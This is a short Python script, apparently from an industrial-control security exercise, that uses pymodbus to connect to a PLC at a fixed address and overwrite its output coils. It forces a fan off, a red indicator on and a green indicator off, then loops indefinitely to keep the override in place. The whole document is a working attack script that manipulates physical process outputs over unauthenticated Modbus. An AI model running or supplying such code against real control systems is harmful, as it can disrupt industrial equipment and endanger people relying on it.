from pymodbus.client import ModbusTcpClient
import time

# Function to find the PLC's IP address (if not known)
def find_plc_ip():
    # You can implement a network scan or use a predefined list of IPs
    # For simplicity, we assume the IP is known or provided by the user
    return "192.168.9.24"

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip):
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip)
        if not client.connect():
            print(f"Failed to connect to PLC at {plc_ip}")
            return

        print(f"Connected to PLC at {plc_ip}")

        # Override the output Q_FAN (%Q0.0) to turn it OFF
        client.write_coil(address=0, value=False, unit=1)
        print("Overridden Q_FAN (%Q0.0) to OFF")

        # Override the output Q_REDA (%Q0.4) to turn it ON
        client.write_coil(address=4, value=True, unit=1)
        print("Overridden Q_REDA (%Q0.4) to ON")

        # Override the output Q_GREENA (%Q0.5) to turn it OFF
        client.write_coil(address=5, value=False, unit=1)
        print("Overridden Q_GREENA (%Q0.5) to OFF")

        # Simulate continuous monitoring and manipulation
        while True:
            time.sleep(1)  # Maintain the override state

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()
        print("Disconnected from PLC")

# Main function
if __name__ == "__main__":
    # Find the PLC's IP address (if not known)
    plc_ip = find_plc_ip()
    print(f"PLC IP Address: {plc_ip}")

    # Manipulate the I/O image
    manipulate_io_image(plc_ip)